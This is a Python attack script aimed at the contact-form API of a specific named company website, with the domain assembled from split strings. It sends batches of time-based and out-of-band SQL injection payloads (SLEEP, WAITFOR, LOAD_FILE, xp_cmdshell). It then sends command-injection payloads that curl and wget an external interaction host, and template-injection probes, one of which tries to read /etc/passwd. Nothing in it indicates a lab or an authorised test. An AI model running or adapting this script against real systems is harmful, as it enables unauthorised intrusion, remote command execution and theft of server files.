import requests, time, sys
BASE = "https://www." + "infinity" + "capital" + ".bh" + "/api" + "/send"
HOST = "infinity" + "capital" + ".bh"
EMAIL = "info" + "@" + HOST
SQLI = "oob7a674be3f434.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi" + ".co" + ".in"
CMD  = "oobb0051ecd5830.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi" + ".co" + ".in"
H = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
     "Referer": "https://www." + HOST + "/contact"}

def send(over):
    d = {"fname": "James", "lname": "Tester", "areacode": "+973", "tel": "3612345",
         "cname": "James Tester", "subject": "Investment Opportunities",
         "msg": "hello there", "check": "", "targets": EMAIL}
    d.update(over)
    t0 = time.time()
    try:
        r = requests.post(BASE, data=d, headers=H, timeout=25, allow_redirects=False)
        return str(r.status_code), len(r.text), round(time.time()-t0, 2), r.text[:240].replace("\n", " ")
    except Exception as e:
        return "ERR", 0, round(time.time()-t0, 2), str(e)[:120]

def hexs(s):
    return "0x" + "".join("%02x" % ord(c) for c in s)

print("TARGET", BASE, "EMAIL", EMAIL)
print("== BASELINE (valid) ==")
print(send({}))
print()
print("== SQLi ==")
sqli = [
 {"msg": "hello' AND SLEEP(5)-- -"},
 {"msg": "hello'; WAITFOR DELAY '0:0:5'-- -"},
 {"msg": "hello' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -"},
 {"msg": "hello'||(SELECT pg_sleep(5))||'"},
 {"msg": "hello' UNION SELECT LOAD_FILE(" + hexs("http://" + SQLI + "/sqli") + ")-- -"},
 {"cname": "x' AND (SELECT LOAD_FILE(" + hexs("http://" + SQLI + "/sqli2") + "))-- -"},
 {"subject": "x'; EXEC xp_cmdshell 'SELECT 1';-- -"},
 {"msg": "hello' AND benchmark(5000000,MD5('a'))-- -"},
]
for o in sqli:
    st, ln, dt, body = send(o)
    print("%-6s t=%-5s len=%-4s %-72s | %s" % (st, dt, ln, str(o)[:72], body[:110]))
print()
print("== CMDi ==")
for o in [{"subject": "a; curl http://" + CMD + "/cm1; sleep 3"},
          {"msg": "`id` ; curl http://" + CMD + "/cm2"},
          {"cname": "$(curl http://" + CMD + "/cm3)"},
          {"fname": "| curl http://" + CMD + "/cm4"},
          {"fname": "; wget http://" + CMD + "/cm5"},
          {"msg": "x\nid\n"}]:
    st, ln, dt, body = send(o)
    print("%-6s t=%-5s len=%-4s %-72s | %s" % (st, dt, ln, str(o)[:72], body[:110]))
print()
print("== SSTI ==")
for o in [{"fname": "{{7*7}}"}, {"fname": "${7*7}"}, {"fname": "<%= 7*7 %>"},
          {"fname": "#{7*7}"}, {"msg": "{{7*7}}"}, {"fname": "<%=File.read('/etc/passwd')%>"}]:
    st, ln, dt, body = send(o)
    print("%-6s len=%-4s %-40s | %s" % (st, ln, str(o)[:40], body[:110]))